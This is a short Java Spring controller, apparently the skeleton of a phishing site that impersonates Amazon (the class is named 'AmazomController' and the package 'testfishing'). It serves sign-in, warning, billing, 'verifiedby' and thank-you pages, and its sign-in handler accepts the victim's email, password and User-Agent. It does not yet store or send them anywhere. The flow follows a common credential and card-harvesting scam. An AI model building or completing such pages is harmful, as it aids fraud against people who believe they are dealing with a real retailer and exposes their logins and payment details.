package com.kidd.testfishing1.web;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@Controller
public class AmazomController {

    @GetMapping("/signin")
    public Object signin(){
        return "signin";
    }

    @PostMapping("/signin")
    public Object signin2(@RequestParam("PW") String pw,@RequestParam("EM") String em,@RequestHeader("User-Agent") String agent){
        Integer a = 1;
        return "warning";
    }

    @GetMapping("/warning")
    public Object warning(Model model){
        return "warning";
    }

    @GetMapping("/billing")
    public Object billing(Model model){
        return "billing";
    }

    @GetMapping("/verifiedby")
    public Object verifiedby(Model model){
        return "verifiedby";
    }

    @GetMapping("/thanks")
    public Object thanks(Model model){
        return "thanks";
    }
}
